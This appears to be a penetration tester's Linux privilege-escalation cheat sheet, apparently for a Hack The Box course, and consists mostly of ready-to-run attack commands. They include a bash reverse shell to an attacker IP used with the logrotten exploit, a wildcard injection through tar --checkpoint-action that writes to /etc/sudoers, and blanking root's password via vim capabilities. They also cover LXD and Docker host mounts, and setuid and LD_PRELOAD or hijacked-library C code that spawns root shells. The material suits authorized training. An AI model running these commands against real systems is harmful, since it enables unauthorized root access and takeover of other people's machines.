# Information Gathering

## -Environment Enumeration-

**Helper Scripts**

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) | [LinEnum](https://github.com/rebootuser/LinEnum) | [Lynis](https://github.com/CISOfy/lynis)

| **Command**                                                              | **Description**                                                 |
| ------------------------------------------------------------------------ | --------------------------------------------------------------- |
| `whoami`                                                                 | Describes current user                                          |
| `id`                                                                     | Describes the groups that the current user belongs to           |
| `hostname`                                                               | What the is server named                                        |
| `ifconfig or ip -a`                                                      | What subnet the server is in                                    |
| `sudo -l`                                                                | can the user run anything with sudo                             |
| `cat /etc/os-release`                                                    | Check OS and version                                            |
| `echo $PATH`                                                             | Check the current users path                                    |
| `env`                                                                    | Check all environment variables for user                        |
| `uname -a`                                                               | Check the Kernel version                                        |
| `lscpu`                                                                  | Information about the host itself such as the CPU type/version  |
| `cat /etc/shells`                                                        | What login shells exist on the server                           |
| `lsblk`                                                                  | Look at the drives and any shares on the system                 |
| `lpstat`                                                                 | Find information about any printers attached to the system      |
| `cat /etc/fstab`                                                         | Check for mounted drive creds by grepping for username/password |
| `route or netstat -rn`                                                   | Check routing table                                             |
| `/etc/resolv.conf`                                                       | Useful for domain joined servers                                |
| `arp -a`                                                                 | Check the ARP table for other hosts                             |
| `cat /etc/passwd`                                                        | Find info about users on the system                             |
| `cat /etc/shadow`                                                        | Login info for users (unlikely to be readable without root)     |
| `cat /etc/group`                                                         | Find information about the system groups (and users)            |
| `getent group sudo`                                                      | Query group file for interesting groups/users                   |
| `ls -lisa /home`                                                         | ALWAYS check the home directory for current user and others     |
| `df -h`                                                                  | General information about the linux distro                      |
| `cat /etc/fstab \| grep -v "#" \| column -t`                             | Find unmounted file systems                                     |
| `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null \| grep <USER>` | Find all hidden user files                                      |
| `find / -type d -name ".*" -ls 2>/dev/null`                              | Find all hidden directories                                     |
| `ls -lisa /tmp /var/tmp /dev/shm`                                        | Check tmp folders for scripts or other loot                     |

## -Linux Services & Internals Enumeration-

| **Command**                                                                                                                                                                              | **Description**                                                                      |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| `cat /etc/hosts`                                                                                                                                                                         | Describes current users hosts file                                                   |
| `lastlog`                                                                                                                                                                                | Find the last login time for user                                                    |
| `who or finger`                                                                                                                                                                          | Check if anyone is on the system at the same time                                    |
| `history`                                                                                                                                                                                | Check the users command history                                                      |
| `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`                                                                                                     | Find any special history files created by scripts/programs                           |
| `ls -la /etc/cron.daily/`                                                                                                                                                                | Show all daily cron jobs on the system                                               |
| `find /proc -name cmdline -exec cat {} \; 2>/dev/null\| tr " " "\n"`                                                                                                                     | Find information from proc/procfs file system on processes, hardware, etc            |
| `apt list --installed \| tr "/" " " \| cut -d" " -f1,3 \| sed 's/[0-9]://g' \| tee -a installed_pkgs.list`                                                                               | List of installed packages                                                           |
| `for i in $(curl -s https://gtfobins.github.io/ \| html2text \| cut -d" " -f1 \| sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done` | Bash one-liner that will compare installed binaries to GTFObins to investigate later |
| `sudo -V`                                                                                                                                                                                | Check the sudo version for known exploits                                            |
| `ls -l /bin /usr/bin/ /usr/sbin/`                                                                                                                                                        | Look for compiled binaries installed on system                                       |
| `ps aux \| grep root`                                                                                                                                                                    | Find services running as root user                                                   |
| `find / -type f -name "*.sh" 2>/dev/null \| grep -v "src\\\|snap\\\|share"`                                                                                                              | Find all scripts on system                                                           |
| `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`                                                                                                      | Find all configuration files                                                         |
| `strace ping -c1 <IP ADDR>`                                                                                                                                                              | Linix diagnostic tool to track and analyze system calls and signal processing        |

## -Credentials Hunting-

| **Command**                                                       | **Description**                                                      |
| ----------------------------------------------------------------- | -------------------------------------------------------------------- |
| `cat wp-config.php \| grep 'DB_USER\|DB_PASSWORD'`                | ALWAYS check web root for creds (example WP site MySQL SB)           |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` | Find spool or mail directories to check for creds                    |
| `ls ~/.ssh`                                                       | Check current user for SSH keys and known_hosts file to find targets |

# Environment-based Privilege Escalation

## -Path Abuse-

| **Command**                                          | **Description**                                                         |
| ---------------------------------------------------- | ----------------------------------------------------------------------- |
| `echo $PATH or env \| grep PATH`                     | Check the contents of the PATH variable                                 |
| `PATH=.:${PATH} && export PATH && echo $PATH`        | Add the '.' current dir to user's PATH to abuse PATH                    |
| `touch ls && echo 'echo "TEST"' > ls && chmod +x ls` | _Example of how path abuse can be used if current dir is added to PATH_ |

## -Wildcard Abuse-

This attack is based on the environment available. An example of this type of attack follows:

Take the following vulnerable cron job on the victim's system:

```
#
#
mh dom mon dow command
*/01 * * * * cd /root && tar -zcf /tmp/backup.tar.gz *
```

The wildcard in the cronjob can be abused when the attacker commands are written as file names. This causes the cronjob to run the attacker commands:

```
user@NIX02:~$ echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
user@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
user@NIX02:~$ echo "" > --checkpoint=1
```

## -Escaping Restricted Shells-

**Types of restricted shells:**

[Restricted Bourne shell (rbash)](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) | [Restricted Korn shell (rksh)](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) | [Restricted Z shell (rzsh)](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html)

When in a restricted shell there will be a pre-defined set of actions that are allowed. The first step in escaping is determining the capabilities of the shell.

Take the example scenario where the restricted shell only allows `ls -l` or `ls -a` to be run. In this case command injection may be possible to escape the shell by injecting additional commands into the args of the ls command.

```
Anon4Now@NIX[/home]$ ls -l `pwd`
```

This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow for the execution of the pwd command and seeing the current working directory, even though the shell does not allow us to execute the pwd command directly.

Other possible techniques:

- Command Substitution: This involves using the shell's command substitution syntax to execute a command.
- Command Chaining: Use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command.
- Environment Variables: Modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell.
- Shell Functions: Define and call shell functions that execute commands not restricted by the shell.

# Permissions-based Privilege Escalation

## -Special Permissions-

| **Command**                                                     | **Description**                 |
| --------------------------------------------------------------- | ------------------------------- |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with SUID bit set |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with SGID bit set |

## -Sudo Rights Abuse-

| **Command** | **Description**                           |
| ----------- | ----------------------------------------- |
| `sudo -l`   | Check if current user has sudo privileges |

## -Privileged Groups-

**LXC/LXD**

LXD is similar to Docker and is Ubuntu's container manager. If the user is part of the 'lxd' group, this may be an opportunity for privilege escalation.

Reference the below section Containers on how to potentially exploit this group.

```
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

**Docker**

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers.

Reference the below section Containers on how to potentially exploit this group.

```
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

**Disk**

Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges.

```
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(disk)
```

**ADM**

Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

```
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

## -Capabilities-

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.

| **Capability**       | **Description**                                                                                                                                           |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| cap_sys_admin        | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.                                     |
| cap_sys_chroot`      | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.            |
|                      |
| cap_sys_ptrace       | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| cap_sys_nice         | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.               |
| cap_sys_time         | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.                |
| cap_sys_resource     | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.       |
|                      |
| cap_sys_module       | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.      |
| cap_net_bind_service | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.                         |

| **Command**                                                                         | **Description**                                                          |
| ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;` | Find binaries on the system and show the capabilities that have been set |

_Example below of how capabilities could be used to escalate privileges:_

Check the capabilities of the binary.

```
Anon4Now@NIX[/home]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

Read the first entry in passwd file.

```
Anon4Now@NIX[/home]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

Use the cap_sys_admin capability of the /usr/bin/vim binary to modify a system file:

```
Anon4Now@NIX[/home]$ /usr/bin/vim.basic /etc/passwd
```

Modify the first entry in the passwd file to remove the 'x' in the line (allows for login without pass).

```
Anon4Now@NIX[/home]$ echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
Anon4Now@NIX[/home]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Switch user to root.

```
Anon4Now@NIX[/home]$ su -
```

# Service-based Privilege Escalation

## -Vulnerable Services-

Always check the versions of the services that are running, to determine whether a known exploit exists.

| **Command**                                | **Description**                            |
| ------------------------------------------ | ------------------------------------------ |
| `systemctl --type=service --state=running` | Find running services to check versions on |

## -Cron Job Abuse-

| **Command**                                                   | **Description**                                                                                                         |
| ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` | Look for writeable files or directories, specifically scripts                                                           |
| `./pspy64 -pf -i 1000`                                        | Run [pspy](https://github.com/DominicBreuker/pspy) to view running processes, commands by other users, cronjobs, etc... |

## -Containers-

**LXC/LXD**

To exploit either lxc or lxd, the attacker needs to be able to run a container on the target machine. This can be accomplished by either transferring a container image to the target, or finding an image leftover from the sysadmin. From there the following commands (or similar) can be run to escalate privileges.

Requires group privileges to run:

```
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

| **Command**                                                                                    | **Description**                                                     |
| ---------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| `lxc image import <IMAGE_NAME> --alias <ALIAS_NAME>`                                           | Import an image file into LXC (e.g., ubuntu-template.tar.xz)        |
| `lxc image list`                                                                               | List the container images on the server                             |
| `lxc init <ALIAS_NAME> <CONTAINER_NAME> -c security.privileged=true`                           | Initiate the image with the 'security.privileged=true' flag         |
| `lxc config device add <CONTAINER_NAME> host-root disk source=/ path=/mnt/root recursive=true` | Update the image config for mounting the container on the root path |
| `lxc start <CONTAINER_NAME>`                                                                   | Start the container                                                 |
| `lxc exec <CONTAINER_NAME> /bin/bash`                                                          | Log into running container with bash                                |
| `ls -l /mnt/root`                                                                              | Check the mounted host machine file directory                       |

**Linux Docker**

To escalate privileges the attacker needs to be in the docker group (shown below), in the sudoers file, or docker needs to have the SUID bit set. If any of these scenarios are present, the attacker can control the docker daemon and access the root file system. A docker image must either be present on the machine or one must be transferred.

```
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

| **Command**                                                   | **Description**                                                                           |
| ------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| `docker image ls`                                             | List the docker images on the host                                                        |
| `docker run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt bash` | Run a container from the image, mount to the host directory, and shell into the container |
| `ls -l /mnt`                                                  | Check the mounted host machine file directory                                             |

**Docker Socket**

A case that can also occur is when the Docker socket is writable. Usually this socket is located in /var/run/docker.sock, however the location can differ. This location can only be written by root or docker group, which if the attacker acts as a user not in one of these two groups and the Docker socket still has the privileges to be writable, then it should provide an opportunity to escalate privileges.

| **Command**                                                                                  | **Description**                                                    |
| -------------------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt bash` | Run as a user not in root or docker group, mount to host, and bash |
| `ls -l /mnt`                                                                                 | Check the mounted host machine file directory                      |

## -Logrotate-

Logrotate is the Linux program tasked with managing the accumulation of log files on the machine to prevent the hard disk from overflowing. It accomplishes this by either renaming the file '.old' or emptying the file contents.

To exploit logrotate, there are some pre-requisites the must be met:

- The attacker needs write permissions on the log files
- Logrotate must run as a privileged user or root
- Logrotate has to be a vulnerable version:
  - 3.8.6
  - 3.11.0
  - 3.15.0
  - 3.18.0

If the above requirements are met, the pre-fabricated exploit [logrotten](https://github.com/whotwagner/logrotten) can be used on the target machine.

| **Command**                                                             | **Description**                                                                    |
| ----------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| `git clone https://github.com/whotwagner/logrotten.git && cd logrotten` | Download the exploit repo and cd into it                                           |
| `gcc logrotten.c -o logrotten`                                          | Compile the source code                                                            |
| `echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload`             | Generate payload (IT DOES NOT NEED TO BE THE EXAMPLE ONE)                          |
| `grep "create\|compress" /etc/logrotate.conf \| grep -v "#"`            | Determine the function used by logrotate (necessary to select the correct exploit) |
| `nc -nlvp <PORT>`                                                       | Start netcat on attacker machine to catch reverse shell                            |
| `./logrotten -p ./payload /tmp/tmp.log`                                 | Run exploit on target machine and wait for shell                                   |

## -Misc Techniques-

These techniques are entirely dependent on some services/tools being available on the target machine. This section will have new additions to it if the technique does not easily fit into another category.

**Passive Network Traffic Capture**

If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

**Weak NFS Privileges**

Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049.

_Show accessible mounts_

```
Anon4Now@attacker[/home]$ showmount -e <TARGET_IP>

Export list for <TARGET_IP>:
/tmp             *
/var/nfs/general *
```

_Check mount permissions_

```
target@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

| **Option**     | **Description**                                                                                                                                                                                                                                                                           |
| -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| root_squash    | If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set. |
|                |
| no_root_squash | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.                                                                       |
|                |

_Create simple binary starts a bash shell target host_

```
target@NIX02:~$ cat shell.c

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

target@NIX02:/tmp$ gcc shell.c -o shell
```

_Mount the directory locally, copy it, and set the necessary permissions_

```
root@Pwnbox:~$ sudo mount -t nfs <TARGET_IP>:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

_Switch back to low-privileged user and execute binary to gain elevated privileges_

```
target@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

**Hijacking Tmux Sessions**

Terminal multiplexers such as tmux can be used to allow multiple terminal sessions to be accessed within a single console session. A user may leave a tmux process running as a privileged user, such as root set up with weak permissions, and can be hijacked.

_Check for any running tmux processes_

```
target@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

_Confirm permissions_

```
target@NIX02:~$ ls -la /shareds

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

_Review compromised user group membership_

```
target@NIX02:~$ id

uid=1000(target) gid=1000(target) groups=1000(target),1011(devs)
```

_Attach to the tmux session and confirm root privileges_

```
target@NIX02:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```

# Linux Internals-based Privilege Escalation

## -Shared Libraries-

It is common for Linux programs to use dynamically linked shared object libraries. Two types of libraries exist in Linux: static libraries (denoted by the .a file extension) and dynamically linked shared object libraries (denoted by the .so file extension).

There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the -rpath or -rpath-link flags when compiling a program, using the environmental variables LD_RUN_PATH or LD_LIBRARY_PATH, placing libraries in the /lib or /usr/lib default directories, or specifying another directory containing the libraries within the /etc/ld.so.conf configuration file.

Additionally, the LD_PRELOAD environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the ldd utility.

**LD_PRELOAD Privilege Escalation**

To use LD_PRELOAD to escalate privileges, the compromised user must have sudo privileges.

_Check user privileges_

```
target@NIX02:~$ sudo -l

Matching Defaults entries for target on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User target may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

_Create malicious C code_

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

_Compile the code with the following flags_

```
target@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

_Escalate privileges using the below command (Make sure to specify the full path to the malicious library file)_

```
target@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

## -Shared Object Hijacking-

Programs and binaries under development usually have custom libraries associated with them. If a custom program or binary is ID'd on the target machine, use the [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) command to print the shared object required by a binary or shared object. Ldd displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.

_Run ldd on custom binary_

```
target@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

A non-standard library named libshared.so was listed as a dependency for the binary. It is possible to load shared libraries from custom locations. One such setting is the RUNPATH configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.

_Run readelf on custom binary_

```
target@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

The configuration allows the loading of libraries from the /development folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in /development, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).

_Check folder permissions_

```
target@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

Copy an existing library to the development folder. Running ldd against the binary lists the library's path as /development/libshared.so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named dbquery. The attacker can now compile a shared object which includes this function.

_Copy one of the library dependencies to the exploitable folder_

```
target@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

_Confirm that the custom binary is looking for dependencies in the exploitable folder_

```
target@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

_Attempt to run the binary to find which function is being called in the shared library_

```
target@NIX02:~$ ./payroll

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

_Create malicious C code that will create a bash shell using the name of the function being called from shared library_

```
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

_Compile the C code with the following flags_

```
target@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so

```

_Execute binary and check for root shell_

```
target@NIX02:~$ ./payroll

***************Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(target) groups=1000(target)
```

## -Python Library Hijacking-

# Recent 0-Days (as of 6-16-23)

## Sudo

## Polkit

## Dirty Pipe

## Netfilter

| **Command**                                                                         | **Description**                                       |
| ----------------------------------------------------------------------------------- | ----------------------------------------------------- |
| `ssh htb-student@<target IP>`                                                       | SSH to lab target                                     |
|  `ps aux \| grep root`                                                              | See processes running as root                         |
| `ps au`                                                                             | See logged in users                                   |
| `ls /home`                                                                          | View user home directories                            |
| `ls -l ~/.ssh`                                                                      | Check for SSH keys for current user                   |
| `history`                                                                           | Check the current user's Bash history                 |
| `sudo -l`                                                                           | Can the user run anything as another user?            |
| `ls -la /etc/cron.daily`                                                            | Check for daily Cron jobs                             |
| `lsblk`                                                                             | Check for unmounted file systems/drives               |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`                       | Find world-writeable directories                      |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`                       | Find world-writeable files                            |
| `uname -a`                                                                          | Check the Kernel versiion                             |
| `cat /etc/lsb-release `                                                             | Check the OS version                                  |
| `gcc kernel_expoit.c -o kernel_expoit`                                              | Compile an exploit written in C                       |
| `screen -v`                                                                         | Check the installed version of `Screen`               |
| `./pspy64 -pf -i 1000`                                                              | View running processes with `pspy`                    |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SUID bit set                   |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SETGID bit set                 |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump`                               |
| `echo $PATH`                                                                        | Check the current user's PATH variable contents       |
| `PATH=.:${PATH}`                                                                    | Add a `.` to the beginning of the current user's PATH |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`                   | Search for config files                               |
| `ldd /bin/ls`                                                                       | View the shared objects required by a binary          |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`                            | Escalate privileges using `LD_PRELOAD`                |
| `readelf -d payroll  \| grep PATH`                                                  | Check the RUNPATH of a binary                         |
| `gcc src.c -fPIC -shared -o /development/libshared.so`                              | Compiled a shared libary                              |
| `lxd init`                                                                          | Start the LXD initialization process                  |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`                  | Import a local image                                  |
| `lxc init alpine r00t -c security.privileged=true`                                  | Start a privileged LXD container                      |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`      | Mount the host file system in a container             |
| `lxc start r00t`                                                                    | Start the container                                   |
| `showmount -e 10.129.2.12`                                                          | Show the NFS export list                              |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt`                                           | Mount an NFS share locally                            |
| `tmux -S /shareds new -s debugsess`                                                 | Created a shared `tmux` session socket                |
| `./lynis audit system`                                                              | Perform a system audit with `Lynis`                   |
